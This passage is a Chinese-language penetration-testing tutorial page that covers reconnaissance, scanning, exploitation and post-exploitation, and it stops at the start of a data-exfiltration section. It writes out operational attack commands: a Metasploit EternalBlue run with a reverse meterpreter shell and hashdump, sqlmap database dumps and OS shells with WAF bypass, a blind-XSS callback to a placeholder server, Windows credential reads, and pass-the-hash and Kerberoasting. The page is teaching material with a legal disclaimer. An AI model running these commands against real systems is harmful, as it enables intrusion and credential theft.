@@ -1,0 +1,1122 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>渗透测试工具全指南 - OWASP 安全知识库</title>
+  <link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+<div class="page-wrapper">
+  <nav class="sidebar">
+    <h2>工具与实战</h2>
+    <ul>
+      <li><a href="01_渗透测试工具.html" class="active">渗透测试工具全指南</a></li>
+      <li><a href="02_CTF入门.html">CTF 入门与实战</a></li>
+    </ul>
+    <h2>本页目录</h2>
+    <ul>
+      <li><a href="#methodology">渗透测试方法论</a></li>
+      <li><a href="#recon">信息收集</a></li>
+      <li><a href="#web-scanning">Web 扫描工具</a></li>
+      <li><a href="#exploitation">漏洞利用</a></li>
+      <li><a href="#post-exploitation">后渗透阶段</a></li>
+      <li><a href="#python-scripting">Python 安全脚本</a></li>
+      <li><a href="#wordlists">字典与 Wordlists</a></li>
+    </ul>
+    <h2>快速导航</h2>
+    <ul>
+      <li><a href="../index.html">返回首页</a></li>
+      <li><a href="../03_OWASP_Top10_2021/A01_权限控制失效.html">OWASP Top10</a></li>
+    </ul>
+  </nav>
+
+  <main class="main-content">
+    <div class="breadcrumb">
+      <a href="../index.html">首页</a> / <a href="01_渗透测试工具.html">工具与实战</a> / 渗透测试工具全指南
+    </div>
+
+    <h1>渗透测试工具全指南</h1>
+    <p>渗透测试（Penetration Testing）是通过模拟真实攻击者的手法来评估系统安全性的过程。本章系统性地介绍渗透测试的完整流程与核心工具集，从信息收集到后渗透利用，覆盖每个阶段的关键技术与工具。</p>
+
+    <div class="info-box note">
+      <div class="box-title">学习目标</div>
+      <ul>
+        <li>掌握渗透测试的标准方法论与完整流程</li>
+        <li>熟练使用 Nmap、Burp Suite、Metasploit 等核心工具</li>
+        <li>理解被动侦察与主动扫描的区别和适用场景</li>
+        <li>能够编写 Python 自动化安全脚本</li>
+        <li>了解后渗透阶段的权限提升与横向移动技术</li>
+      </ul>
+    </div>
+
+    <div class="info-box warning">
+      <div class="box-title">法律声明</div>
+      <p><strong>在未经授权的情况下对任何系统进行渗透测试是违法行为。</strong>请仅在自己的实验环境或取得书面授权后进行安全测试。本章内容仅用于教育目的。</p>
+    </div>
+
+    <!-- Section 1: 方法论 -->
+    <h2 id="methodology">1. 渗透测试方法论</h2>
+
+    <h3>1.1 标准流程概览</h3>
+    <p>一次完整的渗透测试遵循如下阶段化方法论：</p>
+
+    <div class="diagram">渗透测试完整流程：
+
+┌─────────────┐    ┌─────────────┐    ┌──────────────┐    ┌────────────────┐    ┌─────────────┐
+│  Reconnais- │    │  Scanning   │    │ Exploitation │    │    Post-       │    │  Reporting  │
+│  sance      │───▶│  & Enum     │───▶│              │───▶│  Exploitation  │───▶│             │
+│  信息收集    │    │  扫描与枚举  │    │  漏洞利用     │    │  后渗透        │    │  报告撰写    │
+└─────────────┘    └─────────────┘    └──────────────┘    └────────────────┘    └─────────────┘
+       │                  │                  │                     │                    │
+  被动/主动侦察     端口/服务/漏洞      获取初始访问权限      权限提升/横向移动      整理发现/修复建议
+  目标范围确认       版本指纹识别        利用已知漏洞         数据收集/持久化        风险评级/PoC</div>
+
+    <h3>1.2 常见方法论框架</h3>
+    <table>
+      <thead>
+        <tr><th>框架名称</th><th>全称</th><th>特点</th><th>适用场景</th></tr>
+      </thead>
+      <tbody>
+        <tr><td>PTES</td><td>Penetration Testing Execution Standard</td><td>7个阶段，标准化流程</td><td>通用渗透测试</td></tr>
+        <tr><td>OWASP Testing Guide</td><td>OWASP Web Security Testing Guide</td><td>专注Web应用，详细测试用例</td><td>Web 应用测试</td></tr>
+        <tr><td>OSSTMM</td><td>Open Source Security Testing Methodology</td><td>科学化测量方法</td><td>安全审计</td></tr>
+        <tr><td>NIST SP 800-115</td><td>Technical Guide to Information Security Testing</td><td>政府/合规导向</td><td>合规性评估</td></tr>
+        <tr><td>MITRE ATT&CK</td><td>Adversarial Tactics, Techniques & Common Knowledge</td><td>攻击者行为知识库</td><td>红队/威胁模拟</td></tr>
+      </tbody>
+    </table>
+
+    <h3>1.3 渗透测试类型</h3>
+    <table>
+      <thead>
+        <tr><th>类型</th><th>英文</th><th>测试者知道什么</th><th>模拟场景</th></tr>
+      </thead>
+      <tbody>
+        <tr><td>黑盒测试</td><td>Black Box</td><td>仅知道目标名称/URL</td><td>外部攻击者</td></tr>
+        <tr><td>白盒测试</td><td>White Box</td><td>源代码、架构图、凭据</td><td>内部审计/代码审计</td></tr>
+        <tr><td>灰盒测试</td><td>Gray Box</td><td>部分信息（低权限账户等）</td><td>已被入侵的内部人员</td></tr>
+      </tbody>
+    </table>
+
+    <!-- Section 2: 信息收集 -->
+    <h2 id="recon">2. 信息收集 (Reconnaissance)</h2>
+
+    <h3>2.1 被动侦察 (Passive Reconnaissance)</h3>
+    <p>被动侦察不直接与目标系统交互，目标无法察觉你的存在。这是渗透测试的第一步。</p>
+
+    <h4>2.1.1 WHOIS 查询</h4>
+    <pre><code># 查询域名注册信息
+whois example.com
+
+# 查询 IP 地址归属
+whois 93.184.216.34
+
+# 使用在线工具
+# https://who.is/
+# https://www.whois.com/whois/</code></pre>
+
+    <h4>2.1.2 Google Dorking（高级搜索语法）</h4>
+    <p>利用搜索引擎的高级语法发现目标暴露的敏感信息：</p>
+
+    <table>
+      <thead>
+        <tr><th>Dork 语法</th><th>用途</th><th>示例</th></tr>
+      </thead>
+      <tbody>
+        <tr><td><code>site:</code></td><td>限定搜索域名</td><td><code>site:example.com</code></td></tr>
+        <tr><td><code>filetype:</code></td><td>搜索特定文件类型</td><td><code>filetype:pdf site:example.com</code></td></tr>
+        <tr><td><code>inurl:</code></td><td>URL 中包含关键词</td><td><code>inurl:admin site:example.com</code></td></tr>
+        <tr><td><code>intitle:</code></td><td>页面标题包含关键词</td><td><code>intitle:"index of" site:example.com</code></td></tr>
+        <tr><td><code>intext:</code></td><td>页面正文包含关键词</td><td><code>intext:"password" filetype:log</code></td></tr>
+        <tr><td><code>cache:</code></td><td>查看缓存页面</td><td><code>cache:example.com</code></td></tr>
+        <tr><td><code>ext:</code></td><td>文件扩展名</td><td><code>ext:sql intext:password</code></td></tr>
+      </tbody>
+    </table>
+
+    <div class="info-box note">
+      <div class="box-title">Google Hacking Database (GHDB)</div>
+      <p>Exploit-DB 维护的 GHDB 收录了数千条有用的 dorking 查询语句，可在 <code>https://www.exploit-db.com/google-hacking-database</code> 查阅。</p>
+    </div>
+
+    <h4>2.1.3 Shodan - 物联网搜索引擎</h4>
+    <pre><code># 安装 Shodan CLI
+pip install shodan
+shodan init YOUR_API_KEY
+
+# 搜索特定服务
+shodan search "apache" --fields ip_str,port,org
+shodan search "port:22 country:CN"
+shodan search "http.title:dashboard"
+
+# 查看主机信息
+shodan host 93.184.216.34
+
+# 常用 Shodan Dorks
+# webcam              - 寻找网络摄像头
+# "default password"  - 默认密码设备
+# port:3389 country:CN - 开放 RDP 的中国主机
+# "MongoDB Server Information" port:27017 - 暴露的 MongoDB</code></pre>
+
+    <h4>2.1.4 theHarvester - 邮箱与子域名收集</h4>
+    <pre><code># 基本用法：收集邮箱、子域名、主机
+theHarvester -d example.com -b google,bing,linkedin -l 500
+
+# 参数说明
+# -d  目标域名
+# -b  数据源 (google, bing, linkedin, twitter, shodan, censys, etc.)
+# -l  结果数量限制
+# -f  输出到文件
+
+# 使用所有数据源
+theHarvester -d example.com -b all</code></pre>
+
+    <h4>2.1.5 OSINT 工具集合</h4>
+    <table>
+      <thead>
+        <tr><th>工具</th><th>用途</th><th>类型</th></tr>
+      </thead>
+      <tbody>
+        <tr><td>Maltego</td><td>关系图谱分析，可视化信息关联</td><td>图形化</td></tr>
+        <tr><td>Recon-ng</td><td>模块化信息收集框架</td><td>CLI</td></tr>
+        <tr><td>SpiderFoot</td><td>自动化 OSINT 收集</td><td>Web UI</td></tr>
+        <tr><td>Amass</td><td>子域名枚举（DNS、证书透明度）</td><td>CLI</td></tr>
+        <tr><td>Subfinder</td><td>快速被动子域名发现</td><td>CLI</td></tr>
+        <tr><td>crt.sh</td><td>证书透明度日志搜索</td><td>Web</td></tr>
+      </tbody>
+    </table>
+
+    <h3>2.2 主动侦察 (Active Reconnaissance)</h3>
+    <p>主动侦察直接与目标交互，可能被检测到。核心工具是 Nmap。</p>
+
+    <h4>2.2.1 Nmap - 网络扫描之王</h4>
+
+    <div class="diagram">Nmap 扫描类型决策树：
+
+需要什么信息？
+    │
+    ├── 主机发现（哪些主机在线？）
+    │       └── nmap -sn 192.168.1.0/24
+    │
+    ├── 端口扫描（哪些端口开放？）
+    │       ├── TCP Connect 扫描:  nmap -sT  (完整三次握手，易被检测)
+    │       ├── SYN 半开扫描:      nmap -sS  (仅发 SYN，默认，需 root)
+    │       ├── UDP 扫描:          nmap -sU  (检测 UDP 服务，较慢)
+    │       ├── FIN/Xmas/Null:     nmap -sF/-sX/-sN  (绕过简单防火墙)
+    │       └── ACK 扫描:          nmap -sA  (探测防火墙规则)
+    │
+    ├── 服务/版本检测（什么服务？什么版本？）
+    │       └── nmap -sV --version-intensity 5
+    │
+    ├── 操作系统检测
+    │       └── nmap -O
+    │
+    └── NSE 脚本引擎（漏洞检测/自动化）
+            └── nmap --script=vuln,default</div>
+
+    <pre><code># === Nmap 常用命令 ===
+
+# 1. 主机发现（Ping Scan）
+nmap -sn 192.168.1.0/24                # ICMP + ARP 发现局域网主机
+nmap -sn -PS22,80,443 10.0.0.0/24      # TCP SYN Ping 指定端口
+
+# 2. 端口扫描
+nmap -sS -p- target.com                 # SYN 扫描所有 65535 个端口
+nmap -sS -p 1-1000 target.com           # 扫描前 1000 个端口
+nmap -sS --top-ports 100 target.com     # 扫描最常见的 100 个端口
+nmap -sU --top-ports 20 target.com      # UDP 扫描 Top 20 端口
+
+# 3. 服务版本检测
+nmap -sV -sC target.com                 # 版本检测 + 默认脚本
+nmap -A target.com                       # 全面扫描（-sV -sC -O --traceroute）
+
+# 4. NSE 脚本
+nmap --script=http-enum target.com       # Web 目录枚举
+nmap --script=smb-vuln* target.com       # SMB 漏洞检测
+nmap --script=vuln target.com            # 运行所有漏洞检测脚本
+nmap --script=ssl-heartbleed target.com  # 检测 Heartbleed
+
+# 5. 输出保存
+nmap -sV -oA scan_results target.com    # 同时保存三种格式
+nmap -sV -oN normal.txt target.com      # 普通格式
+nmap -sV -oX results.xml target.com     # XML格式（可导入其他工具）
+
+# 6. 规避检测
+nmap -sS -T2 -f --data-length 50 target.com  # 慢速+分片+随机数据长度
+nmap -D RND:10 target.com               # 使用随机诱饵 IP</code></pre>
+
+    <h4>2.2.2 Masscan - 大规模快速端口扫描</h4>
+    <pre><code># Masscan - 号称全球最快端口扫描器
+# 可以在 6 分钟内扫描整个互联网
+
+# 基本扫描
+masscan 10.0.0.0/8 -p 80,443,8080 --rate 10000
+
+# 扫描常用端口
+masscan 192.168.0.0/16 -p 21-25,80,443,3306,3389,8080 --rate 5000
+
+# 输出为 Nmap 兼容的 XML
+masscan 10.0.0.0/24 -p 1-65535 --rate 1000 -oX results.xml
+
+# 注意：Masscan 速度快但不做服务识别
+# 通常工作流：masscan 快速发现开放端口 → Nmap 详细探测服务</code></pre>
+
+    <div class="info-box note">
+      <div class="box-title">Nmap vs Masscan</div>
+      <p><strong>Masscan</strong> 适合大规模网段的快速端口发现；<strong>Nmap</strong> 适合精确的服务识别和漏洞检测。实战中常结合使用：先用 Masscan 扫全网段定位存活主机和开放端口，再用 Nmap 对发现的目标做深入探测。</p>
+    </div>
+
+    <!-- Section 3: Web 扫描 -->
+    <h2 id="web-scanning">3. Web 扫描工具</h2>
+
+    <h3>3.1 Burp Suite - Web 渗透测试必备</h3>
+    <p>Burp Suite 是 Web 安全测试最重要的工具，集成了代理、扫描、爬虫、重放等功能于一体。</p>
+
+    <div class="diagram">Burp Suite 工作流架构：
+
+┌─────────────────────────────────────────────────────────────────────┐
+│                        Burp Suite Professional                       │
+├─────────────────────────────────────────────────────────────────────┤
+│                                                                      │
+│  浏览器 ──▶ [Proxy] ──▶ 目标服务器                                    │
+│              │    ▲                                                   │
+│              ▼    │                                                   │
+│         [HTTP History]                                               │
+│              │                                                        │
+│    ┌─────────┼─────────┬─────────────┬──────────────┐               │
+│    ▼         ▼         ▼             ▼              ▼               │
+│ [Scanner] [Repeater] [Intruder]  [Decoder]   [Comparer]            │
+│  自动漏洞   手动重放    自动化攻击    编解码       响应对比             │
+│  扫描       修改测试    暴力破解                                      │
+│                                                                      │
+│  [Extender] ──── BApp Store (插件市场)                               │
+│    Autorize, Logger++, JWT Editor, Param Miner...                   │
+│                                                                      │
+└─────────────────────────────────────────────────────────────────────┘</div>
+
+    <h4>3.1.1 Proxy（代理拦截）</h4>
+    <pre><code># 配置步骤：
+# 1. Burp 默认监听 127.0.0.1:8080
+# 2. 浏览器配置 HTTP 代理指向 127.0.0.1:8080
+# 3. 安装 Burp 的 CA 证书以拦截 HTTPS 流量
+#    访问 http://burp 下载证书并导入浏览器
+
+# 拦截模式 (Intercept):
+# - 可以实时修改请求/响应
+# - 修改参数、Cookie、Header
+# - 适合手动测试特定功能点
+
+# HTTP History:
+# - 记录所有经过代理的流量
+# - 支持过滤和搜索
+# - 右键发送到其他模块</code></pre>
+
+    <h4>3.1.2 Scanner（自动漏洞扫描）</h4>
+    <pre><code># Burp Scanner 功能（Professional 版）:
+# - 主动扫描：发送 Payload 测试漏洞
+# - 被动扫描：分析已有流量中的安全问题
+
+# 扫描策略配置：
+# 1. 右键 HTTP History 中的请求 → "Scan"
+# 2. 选择扫描类型:
+#    - Crawl and Audit (爬取并审计)
+#    - Audit selected items (审计选定项)
+# 3. 可配置扫描深度和 Payload 类型
+
+# 常见发现:
+# - SQL Injection
+# - Cross-Site Scripting (XSS)
+# - OS Command Injection
+# - Path Traversal
+# - Information Disclosure</code></pre>
+
+    <h4>3.1.3 Repeater（请求重放）</h4>
+    <pre><code># Repeater 工作流:
+# 1. 从 Proxy History 右键 → Send to Repeater
+# 2. 手动修改请求参数
+# 3. 点击 Send 发送，观察响应
+# 4. 适合逐步测试和验证漏洞
+
+# 使用场景:
+# - 手动测试 SQL Injection payload
+# - 修改 HTTP 头部绕过认证
+# - 测试不同参数值的服务器行为
+# - 验证扫描器发现的漏洞</code></pre>
+
+    <h4>3.1.4 Intruder（自动化攻击）</h4>
+    <pre><code># Intruder 攻击模式:
+#
+# 1. Sniper（狙击手）
+#    - 单个 payload 位置逐一替换
+#    - 用于：测试单个参数的多个值
+#
+# 2. Battering Ram（攻城锤）
+#    - 所有位置使用相同 payload
+#    - 用于：用户名密码相同的测试
+#
+# 3. Pitchfork（叉子）
+#    - 多个 payload 位置，一一对应
+#    - 用于：用户名和对应密码的配对测试
+#
+# 4. Cluster Bomb（集束炸弹）
+#    - 多个 payload 位置，全排列组合
+#    - 用于：暴力破解用户名+密码
+
+# 示例: 暴力破解登录表单
+# POST /login HTTP/1.1
+# username=§admin§&password=§123456§
+# 设置 Payload Set 1: 用户名字典
+# 设置 Payload Set 2: 密码字典
+# 使用 Cluster Bomb 模式</code></pre>
+
+    <h4>3.1.5 关键扩展插件</h4>
+    <table>
+      <thead>
+        <tr><th>插件名称</th><th>功能</th><th>使用场景</th></tr>
+      </thead>
+      <tbody>
+        <tr><td>Autorize</td><td>自动检测越权漏洞 (IDOR/BAC)</td><td>用低权限 Cookie 重放高权限请求</td></tr>
+        <tr><td>Logger++</td><td>高级日志记录和过滤</td><td>精细化流量分析</td></tr>
+        <tr><td>JWT Editor</td><td>编辑和攻击 JWT Token</td><td>JWT 算法混淆、密钥爆破</td></tr>
+        <tr><td>Param Miner</td><td>发现隐藏参数</td><td>Web Cache Poisoning</td></tr>
+        <tr><td>Turbo Intruder</td><td>高速请求发送</td><td>Race Condition 测试</td></tr>
+        <tr><td>Hackvertor</td><td>编码/解码转换</td><td>Payload 编码绕过 WAF</td></tr>
+      </tbody>
+    </table>
+
+    <h3>3.2 OWASP ZAP</h3>
+    <pre><code># OWASP ZAP (Zed Attack Proxy) - 开源替代 Burp Suite
+# 适合初学者和自动化 CI/CD 集成
+
+# 启动 ZAP 代理（默认端口 8080）
+zap.sh -daemon -port 8080
+
+# 自动化扫描
+zap-cli quick-scan --self-contained -s xss,sqli http://target.com
+
+# API 扫描
+zap-cli open-url http://target.com
+zap-cli active-scan http://target.com
+zap-cli report -o report.html -f html
+
+# Docker 一键扫描
+docker run -t owasp/zap2docker-stable zap-baseline.py \
+  -t http://target.com -r report.html</code></pre>
+
+    <h3>3.3 Nikto & WhatWeb</h3>
+    <pre><code># Nikto - Web 服务器漏洞扫描器
+nikto -h http://target.com
+nikto -h https://target.com -ssl
+nikto -h target.com -port 8080 -Tuning x 6   # 仅测试文件上传漏洞
+nikto -h target.com -output report.html -Format htm
+
+# WhatWeb - Web 技术指纹识别
+whatweb http://target.com
+whatweb -v http://target.com          # 详细模式
+whatweb --aggression 3 target.com     # 激进模式（更多请求）
+
+# WhatWeb 可以识别:
+# - CMS (WordPress, Drupal, Joomla)
+# - Web 框架 (Django, Rails, Laravel)
+# - JavaScript 库
+# - Web 服务器版本
+# - 编程语言</code></pre>
+
+    <h3>3.4 目录爆破工具</h3>
+
+    <h4>3.4.1 Gobuster</h4>
+    <pre><code># Gobuster - Go 语言编写的目录/子域名暴力枚举工具
+
+# 目录枚举
+gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
+gobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50
+
+# 带扩展名枚举
+gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt,bak
+
+# 子域名枚举
+gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+
+# VHOST 枚举
+gobuster vhost -u http://target.com -w wordlist.txt</code></pre>
+
+    <h4>3.4.2 Dirsearch</h4>
+    <pre><code># Dirsearch - Python 编写，内置优质字典
+dirsearch -u http://target.com
+dirsearch -u http://target.com -e php,asp,html -t 50
+dirsearch -u http://target.com -w custom_wordlist.txt --exclude-status 403,404</code></pre>
+
+    <h4>3.4.3 ffuf - Fuzz Faster U Fool</h4>
+    <pre><code># ffuf - 高性能 Web Fuzzer，功能远不止目录爆破
+
+# 目录枚举
+ffuf -u http://target.com/FUZZ -w wordlist.txt
+
+# 参数 Fuzzing
+ffuf -u "http://target.com/page?FUZZ=value" -w params.txt
+
+# 值 Fuzzing
+ffuf -u "http://target.com/page?id=FUZZ" -w numbers.txt
+
+# POST 数据 Fuzzing
+ffuf -u http://target.com/login -X POST \
+  -d "username=admin&password=FUZZ" \
+  -w passwords.txt -fc 401
+
+# VHOST 发现
+ffuf -u http://target.com -H "Host: FUZZ.target.com" -w subdomains.txt -fc 302
+
+# 过滤选项
+# -fc 过滤状态码  -fs 过滤响应大小  -fw 过滤单词数  -fl 过滤行数
+ffuf -u http://target.com/FUZZ -w wordlist.txt -fc 404,403 -fs 1234</code></pre>
+
+    <div class="info-box success">
+      <div class="box-title">目录爆破工具选择建议</div>
+      <ul>
+        <li><strong>ffuf</strong>：最灵活，适合各种 Fuzzing 场景，速度极快</li>
+        <li><strong>gobuster</strong>：简单高效，适合快速目录和子域名枚举</li>
+        <li><strong>dirsearch</strong>：内置字典好，递归扫描方便，适合新手</li>
+      </ul>
+    </div>
+
+    <!-- Section 4: 漏洞利用 -->
+    <h2 id="exploitation">4. 漏洞利用 (Exploitation)</h2>
+
+    <h3>4.1 Metasploit Framework</h3>
+    <p>Metasploit 是最强大的渗透测试框架，集成了漏洞利用、Payload 生成、后渗透等功能。</p>
+
+    <div class="diagram">Metasploit 架构：
+
+┌───────────────────────────────────────────────────────────────┐
+│                    Metasploit Framework                         │
+├───────────────────────────────────────────────────────────────┤
+│                                                                │
+│  Interfaces:   msfconsole | msfcli | Armitage(GUI) | API      │
+│                                                                │
+├────────────┬────────────┬───────────┬──────────┬─────────────┤
+│  Exploits  │  Payloads  │ Auxiliary │   Post   │  Encoders   │
+│  漏洞利用   │  攻击载荷   │  辅助模块  │ 后渗透    │  编码器      │
+│            │            │           │          │             │
+│ remote     │ singles    │ scanners  │ gather   │ x86/shikata │
+│ local      │ stagers    │ fuzzers   │ escalate │ cmd/generic │
+│ webapp     │ stages     │ dos       │ persist  │ php/base64  │
+│            │            │ gather    │          │             │
+├────────────┴────────────┴───────────┴──────────┴─────────────┤
+│                      Database (PostgreSQL)                      │
+│              存储扫描结果、凭据、会话信息                          │
+└───────────────────────────────────────────────────────────────┘</div>
+
+    <pre><code># === Metasploit 基本使用 ===
+
+# 启动
+msfdb init          # 初始化数据库
+msfconsole          # 启动主控制台
+
+# 搜索模块
+msf6> search type:exploit platform:windows smb
+msf6> search cve:2021-44228       # 搜索 Log4Shell
+msf6> search name:tomcat
+
+# 使用模块
+msf6> use exploit/windows/smb/ms17_010_eternalblue
+msf6> info                         # 查看模块详情
+msf6> show options                 # 查看需要设置的参数
+
+# 配置参数
+msf6> set RHOSTS 192.168.1.100     # 目标地址
+msf6> set LHOST 192.168.1.50       # 本机地址（接收反弹shell）
+msf6> set LPORT 4444               # 本机监听端口
+
+# 选择 Payload
+msf6> show payloads
+msf6> set PAYLOAD windows/x64/meterpreter/reverse_tcp
+
+# 执行攻击
+msf6> exploit                      # 或 run
+msf6> exploit -j                   # 后台运行
+
+# Meterpreter 常用命令（获取shell后）
+meterpreter> sysinfo               # 系统信息
+meterpreter> getuid                # 当前用户
+meterpreter> hashdump              # 导出密码哈希
+meterpreter> upload /path/file     # 上传文件
+meterpreter> download C:\\file     # 下载文件
+meterpreter> shell                 # 进入系统 shell
+meterpreter> getsystem             # 尝试提权
+meterpreter> migrate PID           # 迁移到其他进程
+meterpreter> screenshot            # 截屏</code></pre>
+
+    <h3>4.2 SQLmap - SQL 注入自动化工具</h3>
+    <pre><code># === SQLmap 基本用法 ===
+
+# 检测 GET 参数注入
+sqlmap -u "http://target.com/page?id=1" --batch
+
+# 检测 POST 参数注入
+sqlmap -u "http://target.com/login" --data="username=admin&password=test" --batch
+
+# 使用 Burp 请求文件
+sqlmap -r request.txt --batch
+
+# 指定注入点（使用 * 标记）
+sqlmap -u "http://target.com/page?id=1*&name=test" --batch
+
+# === 常见场景 ===
+
+# 枚举数据库
+sqlmap -u "http://target.com/page?id=1" --dbs
+
+# 枚举表
+sqlmap -u "http://target.com/page?id=1" -D database_name --tables
+
+# 枚举列
+sqlmap -u "http://target.com/page?id=1" -D database_name -T table_name --columns
+
+# 导出数据
+sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump
+
+# 获取操作系统 Shell
+sqlmap -u "http://target.com/page?id=1" --os-shell
+
+# === 高级技巧 ===
+
+# 指定数据库类型
+sqlmap -u "http://target.com/page?id=1" --dbms=mysql
+
+# 指定注入技术
+# B: Boolean-based blind
+# E: Error-based
+# U: Union query-based
+# S: Stacked queries
+# T: Time-based blind
+sqlmap -u "http://target.com/page?id=1" --technique=BEU
+
+# 绕过 WAF
+sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between
+sqlmap -u "http://target.com/page?id=1" --random-agent --delay=1
+
+# Cookie 注入
+sqlmap -u "http://target.com/page" --cookie="session=abc123; id=1*"
+
+# HTTP Header 注入
+sqlmap -u "http://target.com/page" --headers="X-Forwarded-For: 127.0.0.1*"
+
+# 常用 Tamper 脚本
+# space2comment   - 空格转注释 /**/
+# between         - > 转 NOT BETWEEN 0 AND
+# randomcase      - 随机大小写
+# charencode      - URL 编码
+# apostrophemask  - 单引号转 UTF-8</code></pre>
+
+    <h3>4.3 XSS 工具</h3>
+    <pre><code># === XSStrike - 高级 XSS 检测工具 ===
+# 具有模糊测试、爬虫、WAF 绕过能力
+
+# 基本 GET 参数测试
+python xsstrike.py -u "http://target.com/page?q=test"
+
+# POST 参数测试
+python xsstrike.py -u "http://target.com/search" --data "q=test"
+
+# 爬虫模式
+python xsstrike.py -u "http://target.com" --crawl
+
+# 跳过 DOM 检测
+python xsstrike.py -u "http://target.com/page?q=test" --skip-dom
+
+# === Dalfox - 基于 Go 的高速 XSS 扫描器 ===
+
+# 基本扫描
+dalfox url "http://target.com/page?q=test"
+
+# 从文件读取 URL
+dalfox file urls.txt
+
+# 管道模式（配合其他工具）
+cat params.txt | dalfox pipe
+
+# 使用自定义 payload
+dalfox url "http://target.com/page?q=test" --custom-payload payloads.txt
+
+# 盲打 XSS (使用回调服务器)
+dalfox url "http://target.com/page?q=test" -b "https://your-callback-server.com"</code></pre>
+
+    <div class="info-box danger">
+      <div class="box-title">工具使用警告</div>
+      <p>SQLmap 和 XSS 工具会向目标发送大量恶意请求，可能导致：</p>
+      <ul>
+        <li>触发 WAF/IDS 告警和 IP 封禁</li>
+        <li>产生大量日志记录</li>
+        <li>在极端情况下可能导致服务异常</li>
+      </ul>
+      <p>实战中务必控制请求速率，并确保在授权范围内操作。</p>
+    </div>
+
+    <!-- Section 5: 后渗透 -->
+    <h2 id="post-exploitation">5. 后渗透阶段 (Post-Exploitation)</h2>
+
+    <h3>5.1 权限提升 (Privilege Escalation)</h3>
+
+    <h4>5.1.1 Linux 权限提升</h4>
+    <div class="diagram">Linux 提权检查清单：
+
+┌─────────────────────────────────────────────────────┐
+│              Linux Privilege Escalation              │
+├─────────────────────────────────────────────────────┤
+│                                                     │
+│  1. SUID/SGID 可执行文件                             │
+│     find / -perm -4000 2>/dev/null                  │
+│     → GTFOBins 查找利用方法                          │
+│                                                     │
+│  2. Sudo 错误配置                                    │
+│     sudo -l                                         │
+│     → (ALL) NOPASSWD: /usr/bin/vim                  │
+│                                                     │
+│  3. Cron 定时任务                                    │
+│     cat /etc/crontab                                │
+│     → 可写脚本被 root 定时执行                        │
+│                                                     │
+│  4. 内核漏洞                                         │
+│     uname -a → 搜索对应 CVE                         │
+│     Dirty COW, PwnKit, etc.                         │
+│                                                     │
+│  5. 可写 /etc/passwd 或 /etc/shadow                  │
+│  6. Docker/LXC 逃逸                                 │
+│  7. NFS no_root_squash                              │
+│  8. PATH 变量劫持                                    │
+│  9. Capabilities 滥用                                │
+│                                                     │
+└─────────────────────────────────────────────────────┘</div>
+
+    <pre><code># === LinPEAS - Linux 权限提升枚举脚本 ===
+# 下载
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
+
+# 运行（目标机器）
+chmod +x linpeas.sh
+./linpeas.sh | tee linpeas_output.txt
+
+# 指定检查类别
+./linpeas.sh -s        # 超快模式(silent)
+./linpeas.sh -a        # 所有检查
+
+# === 手动检查命令 ===
+# SUID 文件
+find / -perm -u=s -type f 2>/dev/null
+
+# 可写目录
+find / -writable -type d 2>/dev/null
+
+# Sudo 权限
+sudo -l
+
+# 检查定时任务
+cat /etc/crontab
+ls -la /etc/cron.d/
+crontab -l
+
+# 查看内核版本
+uname -a
+cat /etc/os-release
+
+# 网络信息
+ss -tlnp
+ip route
+
+# 敏感文件搜索
+find / -name "*.conf" -o -name "*.bak" -o -name "*.old" 2>/dev/null | head -20
+grep -r "password" /etc/ 2>/dev/null</code></pre>
+
+    <h4>5.1.2 Windows 权限提升</h4>
+    <pre><code># === WinPEAS - Windows 权限提升枚举 ===
+# 下载并运行
+.\winPEASx64.exe
+
+# === 手动检查 ===
+# 系统信息
+systeminfo
+whoami /priv
+whoami /groups
+
+# 检查未打补丁
+wmic qfe list brief
+
+# 服务权限问题
+sc query state= all
+accesschk.exe -ucqv *service_name* /accepteula
+
+# 计划任务
+schtasks /query /fo LIST /v
+
+# 已存储凭据
+cmdkey /list
+dir C:\Users\*\AppData\Local\Microsoft\Credentials\*
+
+# 注册表自启动
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+
+# AlwaysInstallElevated（MSI提权）
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+# 常见 Windows 提权漏洞:
+# - PrintNightmare (CVE-2021-34527)
+# - PetitPotam
+# - Juicy Potato / Sweet Potato / Rotten Potato
+# - SeImpersonate → Token Impersonation</code></pre>
+
+    <h3>5.2 横向移动 (Lateral Movement)</h3>
+    <table>
+      <thead>
+        <tr><th>技术</th><th>协议/工具</th><th>说明</th></tr>
+      </thead>
+      <tbody>
+        <tr><td>Pass the Hash</td><td>NTLM</td><td>使用哈希直接认证，无需明文密码</td></tr>
+        <tr><td>Pass the Ticket</td><td>Kerberos</td><td>窃取/伪造 Kerberos 票据</td></tr>
+        <tr><td>PsExec</td><td>SMB</td><td>远程执行命令（需管理员凭据）</td></tr>
+        <tr><td>WMI</td><td>DCOM</td><td>Windows Management Instrumentation 远程执行</td></tr>
+        <tr><td>WinRM</td><td>HTTP/HTTPS</td><td>Windows Remote Management</td></tr>
+        <tr><td>RDP Hijacking</td><td>RDP</td><td>劫持已有 RDP 会话</td></tr>
+        <tr><td>SSH Key Reuse</td><td>SSH</td><td>利用已获取的 SSH 私钥</td></tr>
+      </tbody>
+    </table>
+
+    <pre><code># 横向移动示例 (使用 Impacket 工具集)
+
+# PsExec (需要管理员凭据)
+python3 psexec.py domain/username:password@target_ip
+python3 psexec.py -hashes :NTLM_HASH domain/username@target_ip
+
+# WMIExec
+python3 wmiexec.py domain/username:password@target_ip
+
+# Pass the Hash
+python3 smbexec.py -hashes :NTLM_HASH domain/username@target_ip
+
+# Kerberoasting (提取服务票据用于离线破解)
+python3 GetUserSPNs.py domain/username:password -dc-ip DC_IP -request</code></pre>
+
+    <h3>5.3 数据窃取 (Data Exfiltration)</h3>
+    <pre><code># 常见数据外传方法
+
+# 1. HTTP/HTTPS（最常见，不易被拦截）
